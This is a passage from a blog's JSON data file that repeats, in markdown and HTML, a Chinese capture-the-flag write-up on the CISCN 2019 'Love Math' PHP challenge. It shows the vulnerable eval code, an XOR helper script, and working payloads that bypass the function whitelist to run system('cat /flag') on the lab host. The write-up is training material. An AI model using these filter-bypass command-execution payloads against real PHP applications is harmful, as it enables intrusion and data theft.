hypot|\n```\n\n构造payload：`http://c5da3eac-8e0b-45e3-b441-971c92aa946c.node3.buuoj.cn/?c=$pi=decoct(31737)^hexdec;$$pi{abs}($$pi{cos})`\n\npost 数据：`abs=system&cos=cat /flag`\n\n\n\n![](/pic/24.png)\n\n在PHP中无法直接数字与不加引号的字符异或，需要将数字转换成字符类型\n\n![](/pic/25.png)\n\n![](/pic/26.png)\n\n![](/pic/27.png)\n\nPHP异或操作，x位与x+n位异或结果是x位，后面n位直接丢弃。","source":"_posts/buuoj刷题记录7.md","raw":"---\ntitle: buuoj刷题记录7\ndate: 2020-01-10 22:19:24\ntags:\n - buuctf\n - web\n - 命令执行\ncategories: \n - 刷题记录\n---\n\n## CISCN 2019 初赛 Love Math\n\n## 0x00 基础\n\n`eval`可以执行PHP语句\n\n`hex2bin`可以将十六进制的字符转成字符串，结果是字符串类型\n\n`dechex`将十进制转换成十六进制，结果是字符串类型\n\nPHP中数组除了可以使用[ ]  还可以使用{ }\n\nPHP中调用shell命令使用`system()`\n\n<!--more-->\n\nPHP中关于进制转换函数,*dec 都是整型，其他都是字符串类型\n\nhttps://blog.csdn.net/Auuuuuuuu/article/details/88778852\n\n## 0x02 分析\n\n源码分析\n\n```php\n<?php\nerror_reporting(0);\n//听说你很喜欢数学，不知道你是否爱它胜过爱flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //例子 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"太长了不会算\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"请不要输入奇奇怪怪的字符\");\n        }\n    }\n    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"请不要输入奇奇怪怪的函数\");\n        }\n    }\n    //帮你算出答案\n    eval('echo '.$content.';');\n} \n```\n\n会将输入的字符进行过滤，过滤了空格、换行符、制表符、单双引号、反引号、中括号，以及只能出现白名单中的单词。\n\n最后有一个`eval`可以执行PHP语句，想办法构造$\\_GET或者$\\_POST\n\n可以利用函数转变也可以使用异或\n\n## 0x03 操作\n\npayload1：`?sin=cat /flag&cos=system&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{cos}($$pi{sin})`\n\n![](/pic/23.png)\n\n异或方法\n\n开始用python写，字符串转十六进制，纠结了很久很久，只有int可以异或。还是选择PHP\n\n```php\n<?php\n$need=['_GET','_POST','_REQUEST'];\n$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\nforeach ($whitelist as $item )\n{\n    foreach ($need as $x)\n    {\n\n        if (in_array($x ^ $item^ $item ,$need))  //在PHP中异或\n        {\n            echo $x ^ $item;\n            echo '|--- '.$x.' --- '.$item;\n            echo '|<br/>';\n        }\n        \n    }\n}\n?>\n```\n\n在结果中发现有一个纯数字的还有一个`9**0`,但是没想到怎么利用`9**0`\n\n```bash\n9**0|--- _GET --- fmod|\n8\"1&|--- _GET --- getrandmax|\n85;!5|--- _POST --- getrandmax|\n871#4+79|--- _REQUEST --- getrandmax|\n7\"=0|--- _GET --- hexdec|\n75771|--- _POST --- hexdec|\n7>5;|--- _GET --- hypot|\n```\n\n构造payload：`http://c5da3eac-8e0b-45e3-b441-971c92aa946c.node3.buuoj.cn/?c=$pi=decoct(31737)^hexdec;$$pi{abs}($$pi{cos})`\n\npost 数据：`abs=system&cos=cat /flag`\n\n\n\n![](/pic/24.png)\n\n在PHP中无法直接数字与不加引号的字符异或，需要将数字转换成字符类型\n\n![](/pic/25.png)\n\n![](/pic/26.png)\n\n![](/pic/27.png)\n\nPHP异或操作，x位与x+n位异或结果是x位，后面n位直接丢弃。","slug":"buuoj刷题记录7","published":1,"updated":"2020-01-10T14:19:24.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssflg000ppk7e8saa34qk","content":"<h2 id=\"CISCN-2019-初赛-Love-Math\"><a href=\"#CISCN-2019-初赛-Love-Math\" class=\"headerlink\" title=\"CISCN 2019 初赛 Love Math\"></a>CISCN 2019 初赛 Love Math</h2><h2 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h2><p><code>eval</code>可以执行PHP语句</p>\n<p><code>hex2bin</code>可以将十六进制的字符转成字符串，结果是字符串类型</p>\n<p><code>dechex</code>将十进制转换成十六进制，结果是字符串类型</p>\n<p>PHP中数组除了可以使用[ ]  还可以使用{ }</p>\n<p>PHP中调用shell命令使用<code>system()</code></p>\n<a id=\"more\"></a>\n\n<p>PHP中关于进制转换函数,*dec 都是整型，其他都是字符串类型</p>\n<p><a href=\"https://blog.csdn.net/Auuuuuuuu/article/details/88778852\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Auuuuuuuu/article/details/88778852</a></p>\n<h2 id=\"0x02-分析\"><a href=\"#0x02-分析\" class=\"headerlink\" title=\"0x02 分析\"></a>0x02 分析</h2><p>源码分析</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'c'</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//例子 c=20-1</span></span><br><span class=\"line\">    $content = $_GET[<span class=\"string\">'c'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strlen($content) &gt;= <span class=\"number\">80</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"太长了不会算\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $blacklist = [<span class=\"string\">' '</span>, <span class=\"string\">'\\t'</span>, <span class=\"string\">'\\r'</span>, <span class=\"string\">'\\n'</span>,<span class=\"string\">'\\''</span>, <span class=\"string\">'\"'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'\\['</span>, <span class=\"string\">'\\]'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/'</span> . $blackitem . <span class=\"string\">'/m'</span>, $content)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"请不要输入奇奇怪怪的字符\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class=\"line\">    $whitelist = [<span class=\"string\">'abs'</span>, <span class=\"string\">'acos'</span>, <span class=\"string\">'acosh'</span>, <span class=\"string\">'asin'</span>, <span class=\"string\">'asinh'</span>, <span class=\"string\">'atan2'</span>, <span class=\"string\">'atan'</span>, <span class=\"string\">'atanh'</span>, <span class=\"string\">'base_convert'</span>, <span class=\"string\">'bindec'</span>, <span class=\"string\">'ceil'</span>, <span class=\"string\">'cos'</span>, <span class=\"string\">'cosh'</span>, <span class=\"string\">'decbin'</span>, <span class=\"string\">'dechex'</span>, <span class=\"string\">'decoct'</span>, <span class=\"string\">'deg2rad'</span>, <span class=\"string\">'exp'</span>, <span class=\"string\">'expm1'</span>, <span class=\"string\">'floor'</span>, <span class=\"string\">'fmod'</span>, <span class=\"string\">'getrandmax'</span>, <span class=\"string\">'hexdec'</span>, <span class=\"string\">'hypot'</span>, <span class=\"string\">'is_finite'</span>, <span class=\"string\">'is_infinite'</span>, <span class=\"string\">'is_nan'</span>, <span class=\"string\">'lcg_value'</span>, <span class=\"string\">'log10'</span>, <span class=\"string\">'log1p'</span>, <span class=\"string\">'log'</span>, <span class=\"string\">'max'</span>, <span class=\"string\">'min'</span>, <span class=\"string\">'mt_getrandmax'</span>, <span class=\"string\">'mt_rand'</span>, <span class=\"string\">'mt_srand'</span>, <span class=\"string\">'octdec'</span>, <span class=\"string\">'pi'</span>, <span class=\"string\">'pow'</span>, <span class=\"string\">'rad2deg'</span>, <span class=\"string\">'rand'</span>, <span class=\"string\">'round'</span>, <span class=\"string\">'sin'</span>, <span class=\"string\">'sinh'</span>, <span class=\"string\">'sqrt'</span>, <span class=\"string\">'srand'</span>, <span class=\"string\">'tan'</span>, <span class=\"string\">'tanh'</span>];</span><br><span class=\"line\">    preg_match_all(<span class=\"string\">'/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/'</span>, $content, $used_funcs);  </span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($used_funcs[<span class=\"number\">0</span>] <span class=\"keyword\">as</span> $func) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"请不要输入奇奇怪怪的函数\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//帮你算出答案</span></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">'echo '</span>.$content.<span class=\"string\">';'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>会将输入的字符进行过滤，过滤了空格、换行符、制表符、单双引号、反引号、中括号，以及只能出现白名单中的单词。</p>\n<p>最后有一个<code>eval</code>可以执行PHP语句，想办法构造$_GET或者$_POST</p>\n<p>可以利用函数转变也可以使用异或</p>\n<h2 id=\"0x03-操作\"><a href=\"#0x03-操作\" class=\"headerlink\" title=\"0x03 操作\"></a>0x03 操作</h2><p>payload1：<code>?sin=cat /flag&amp;cos=system&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{cos}($$pi{sin})</code></p>\n<p><img src=\"/pic/23.png\" alt=\"\"></p>\n<p>异或方法</p>\n<p>开始用python写，字符串转十六进制，纠结了很久很久，只有int可以异或。还是选择PHP</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$need=[<span class=\"string\">'_GET'</span>,<span class=\"string\">'_POST'</span>,<span class=\"string\">'_REQUEST'</span>];</span><br><span class=\"line\">$whitelist = [<span class=\"string\">'abs'</span>, <span class=\"string\">'acos'</span>, <span class=\"string\">'acosh'</span>, <span class=\"string\">'asin'</span>, <span class=\"string\">'asinh'</span>, <span class=\"string\">'atan2'</span>, <span class=\"string\">'atan'</span>, <span class=\"string\">'atanh'</span>, <span class=\"string\">'base_convert'</span>, <span class=\"string\">'bindec'</span>, <span class=\"string\">'ceil'</span>, <span class=\"string\">'cos'</span>, <span class=\"string\">'cosh'</span>, <span class=\"string\">'decbin'</span>, <span class=\"string\">'dechex'</span>, <span class=\"string\">'decoct'</span>, <span class=\"string\">'deg2rad'</span>, <span class=\"string\">'exp'</span>, <span class=\"string\">'expm1'</span>, <span class=\"string\">'floor'</span>, <span class=\"string\">'fmod'</span>, <span class=\"string\">'getrandmax'</span>, <span class=\"string\">'hexdec'</span>, <span class=\"string\">'hypot'</span>, <span class=\"string\">'is_finite'</span>, <span class=\"string\">'is_infinite'</span>, <span class=\"string\">'is_nan'</span>, <span class=\"string\">'lcg_value'</span>, <span class=\"string\">'log10'</span>, <span class=\"string\">'log1p'</span>, <span class=\"string\">'log'</span>, <span class=\"string\">'max'</span>, <span class=\"string\">'min'</span>, <span class=\"string\">'mt_getrandmax'</span>, <span class=\"string\">'mt_rand'</span>, <span class=\"string\">'mt_srand'</span>, <span class=\"string\">'octdec'</span>, <span class=\"string\">'pi'</span>, <span class=\"string\">'pow'</span>, <span class=\"string\">'rad2deg'</span>, <span class=\"string\">'rand'</span>, <span class=\"string\">'round'</span>, <span class=\"string\">'sin'</span>, <span class=\"string\">'sinh'</span>, <span class=\"string\">'sqrt'</span>, <span class=\"string\">'srand'</span>, <span class=\"string\">'tan'</span>, <span class=\"string\">'tanh'</span>];</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($whitelist <span class=\"keyword\">as</span> $item )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($need <span class=\"keyword\">as</span> $x)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (in_array($x ^ $item^ $item ,$need))  <span class=\"comment\">//在PHP中异或</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> $x ^ $item;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'|--- '</span>.$x.<span class=\"string\">' --- '</span>.$item;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'|&lt;br/&gt;'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在结果中发现有一个纯数字的还有一个<code>9**0</code>,但是没想到怎么利用<code>9**0</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">9**0|--- _GET --- fmod|</span><br><span class=\"line\">8<span class=\"string\">\"1&amp;|--- _GET --- getrandmax|</span></span><br><span class=\"line\"><span class=\"string\">85;!5|--- _POST --- getrandmax|</span></span><br><span class=\"line\"><span class=\"string\">871#4+79|--- _REQUEST --- getrandmax|</span></span><br><span class=\"line\"><span class=\"string\">7\"</span>=0|--- _GET --- hexdec|</span><br><span class=\"line\">75771|--- _POST --- hexdec|</span><br><span class=\"line\">7&gt;5;|--- _GET --- hypot|</span><br></pre></td></tr></table></figure>\n\n<p>构造payload：<code>http://c5da3eac-8e0b-45e3-b441-971c92aa946c.node3.buuoj.cn/?c=$pi=decoct(31737)^hexdec;$$pi{abs}($$pi{cos})</code></p>\n<p>post 数据：<code>abs=system&amp;cos=cat /flag</code></p>\n<p><img src=\"/pic/24.png\" alt=\"\"></p>\n<p>在PHP中无法直接数字与不加引号的字符异或，需要将数字转换成字符类型</p>\n<p><img src=\"/pic/25.png\" alt=\"\"></p>\n<p><img src=\"/pic/26.png\" alt=\"\"></p>\n<p><img src=\"/pic/27.png\" alt=\"\"></p>\n<p>PHP异或操作，x位与x+n位异或结果是x位，后面n位直接丢弃。</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"CISCN-2019-初赛-Love-Math\"><a href=\"#CISCN-2019-初赛-Love-Math\" class=\"headerlink\" title=\"CISCN 2019 初赛 Love Math\"></a>CISCN 2019 初赛 Love Math</h2><h2 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h2><p><code>eval</code>可以执行PHP语句</p>\n<p><code>hex2bin</code>可以将十六进制的字符转成字符串，结果是字符串类型</p>\n<p><code>dechex</code>将十进制转换成十六进制，结果是字符串类型</p>\n<p>PHP中数组除了可以使用[ ]  还可以使用{ }</p>\n<p>PHP中调用shell命令使用<code>system()</code></p>","more":"<p>PHP中关于进制转换函数,*dec 都是整型，其他都是字符串类型</p>\n<p><a href=\"https://blog.csdn.net/Auuuuuuuu/article/details/88778852\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Auuuuuuuu/article/details/88778852</a></p>\n<h2 id=\"0x02-分析\"><a href=\"#0x02-分析\" class=\"headerlink\" title=\"0x02 分析\"></a>0x02 分析</h2><p>源码分析</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'c'</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//例子 c=20-1</span></span><br><span class=\"line\">    $content = $_GET[<span class=\"string\">'c'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strlen($content) &gt;= <span class=\"number\">80</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"太长了不会算\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $blacklist = [<span class=\"string\">' '</span>, <span class=\"string\">'\\t'</span>, <span class=\"string\">'\\r'</span>, <span class=\"string\">'\\n'</span>,<span class=\"string\">'\\''</span>, <span class=\"string\">'\"'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'\\['</span>, <span class=\"string\">'\\]'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/'</span> . $blackitem . <span class=\"string\">'/m'</span>, $content)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"请不要输入奇奇怪怪的字符\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class=\"line\">    $whitelist = [<span class=\"string\">'abs'</span>, <span class=\"string\">'acos'</span>, <span class=\"string\">'acosh'</span>, <span class=\"string\">'asin'</span>, <span class=\"string\">'asinh'</span>, <span class=\"string\">'atan2'</span>, <span class=\"string\">'atan'</span>, <span class=\"string\">'atanh'</span>, <span class=\"string\">'base_convert'</span>, <span class=\"string\">'bindec'</span>, <span class=\"string\">'ceil'</span>, <span class=\"string\">'cos'</span>, <span class=\"string\">'cosh'</span>, <span class=\"string\">'decbin'</span>, <span class=\"string\">'dechex'</span>, <span class=\"string\">'decoct'</span>, <span class=\"string\">'deg2rad'</span>, <span class=\"string\">'exp'</span>, <span class=\"string\">'expm1'</span>, <span class=\"string\">'floor'</span>, <span class=\"string\">'fmod'</span>, <span class=\"string\">'getrandmax'</span>, <span class=\"string\">'hexdec'</span>, <span class=\"string\">'hypot'</span>, <span class=\"string\">'is_finite'</span>, <span class=\"string\">'is_infinite'</span>, <span class=\"string\">'is_nan'</span>, <span class=\"string\">'lcg_value'</span>, <span class=\"string\">'log10'</span>, <span class=\"string\">'log1p'</span>, <span class=\"string\">'log'</span>, <span class=\"string\">'max'</span>, <span class=\"string\">'min'</span>, <span class=\"string\">'mt_getrandmax'</span>, <span class=\"string\">'mt_rand'</span>, <span class=\"string\">'mt_srand'</span>, <span class=\"string\">'octdec'</span>, <span class=\"string\">'pi'</span>, <span class=\"string\">'pow'</span>, <span class=\"string\">'rad2deg'</span>, <span class=\"string\">'rand'</span>, <span class=\"string\">'round'</span>, <span class=\"string\">'sin'</span>, <span class=\"string\">'sinh'</span>, <span class=\"string\">'sqrt'</span>, <span class=\"string\">'srand'</span>, <span class=\"string\">'tan'</span>, <span class=\"string\">'tanh'</span>];</span><br><span class=\"line\">    preg_match_all(<span class=\"string\">'/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/'</span>, $content, $used_funcs);  </span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($used_funcs[<span class=\"number\">0</span>] <span class=\"keyword\">as</span> $func) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"请不要输入奇奇怪怪的函数\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//帮你算出答案</span></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">'echo '</span>.$content.<span class=\"string\">';'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>会将输入的字符进行过滤，过滤了空格、换行符、制表符、单双引号、反引号、中括号，以及只能出现白名单中的单词。</p>\n<p>最后有一个<code>eval</code>可以执行PHP语句，想办法构造$_GET或者$_POST</p>\n<p>可以利用函数转变也可以使用异或</p>\n<h2 id=\"0x03-操作\"><a href=\"#0x03-操作\" class=\"headerlink\" title=\"0x03 操作\"></a>0x03 操作</h2><p>payload1：<code>?sin=cat /flag&amp;cos=system&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{cos}($$pi{sin})</code></p>\n<p><img src=\"/pic/23.png\" alt=\"\"></p>\n<p>异或方法</p>\n<p>开始用python写，字符串转十六进制，纠结了很久很久，只有int可以异或。还是选择PHP</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$need=[<span class=\"string\">'_GET'</span>,<span class=\"string\">'_POST'</span>,<span class=\"string\">'_REQUEST'</span>];</span><br><span class=\"line\">$whitelist = [<span class=\"string\">'abs'</span>, <span class=\"string\">'acos'</span>, <span class=\"string\">'acosh'</span>, <span class=\"string\">'asin'</span>, <span class=\"string\">'asinh'</span>, <span class=\"string\">'atan2'</span>, <span class=\"string\">'atan'</span>, <span class=\"string\">'atanh'</span>, <span class=\"string\">'base_convert'</span>, <span class=\"string\">'bindec'</span>, <span class=\"string\">'ceil'</span>, <span class=\"string\">'cos'</span>, <span class=\"string\">'cosh'</span>, <span class=\"string\">'decbin'</span>, <span class=\"string\">'dechex'</span>, <span class=\"string\">'decoct'</span>, <span class=\"string\">'deg2rad'</span>, <span class=\"string\">'exp'</span>, <span class=\"string\">'expm1'</span>, <span class=\"string\">'floor'</span>, <span class=\"string\">'fmod'</span>, <span class=\"string\">'getrandmax'</span>, <span class=\"string\">'hexdec'</span>, <span class=\"string\">'hypot'</span>, <span class=\"string\">'is_finite'</span>, <span class=\"string\">'is_infinite'</span>, <span class=\"string\">'is_nan'</span>, <span class=\"string\">'lcg_value'</span>, <span class=\"string\">'log10'</span>, <span class=\"string\">'log1p'</span>, <span class=\"string\">'log'</span>, <span class=\"string\">'max'</span>, <span class=\"string\">'min'</span>, <span class=\"string\">'mt_getrandmax'</span>, <span class=\"string\">'mt_rand'</span>, <span class=\"string\">'mt_srand'</span>, <span class=\"string\">'octdec'</span>, <span class=\"string\">'pi'</span>, <span class=\"string\">'pow'</span>, <span class=\"string\">'rad2deg'</span>, <span class=\"string\">'rand'</span>, <span class=\"string\">'round'</span>, <span class=\"string\">'sin'</span>, <span class=\"string\">'sinh'</span>, <span class=\"string\">'sqrt'</span>, <span class=\"string\">'srand'</span>, <span class=\"string\">'tan'</span>, <span class=\"string\">'tanh'</span>];</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($whitelist <span class=\"keyword\">as</span> $item )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> ($need <span class=\"keyword\">as</span> $x)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (in_array($x ^ $item^ $item ,$need))  <span class=\"comment\">//在PHP中异或</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> $x ^ $item;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'|--- '</span>.$x.<span class=\"string\">' --- '</span>.$item;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'|&lt;br/&gt;'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>在结果中发现有一个纯数字的还有一个<code>9**0</code>,但是没想到怎么利用<code>9**0</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">9**0|--- _GET --- fmod|</span><br><span class=\"line\">8<span class=\"string\">\"1&amp;|--- _GET --- getrandmax|</span></span><br><span class=\"line\"><span class=\"string\">85;!5|--- _POST --- getrandmax|</span></span><br><span class=\"line\"><span class=\"string\">871#4+79|--- _REQUEST --- getrandmax|</span></span><br><span class=\"line\"><span class=\"string\">7\"</span>=0|--- _GET --- hexdec|</span><br><span class=\"line\">75771|--- _POST --- hexdec|</span><br><span class=\"line\">7&gt;5;|--- _GET --- hypot|</span><br></pre></td></tr></table></figure>\n\n<p>构造payload：<code>http://c5da3eac-8e0b-45e3-b441-971c92aa946c.node3.buuoj.cn/?c=$pi=decoct(31737)^hexdec;$$pi{abs}($$pi{cos})</code></p>\n<p>post 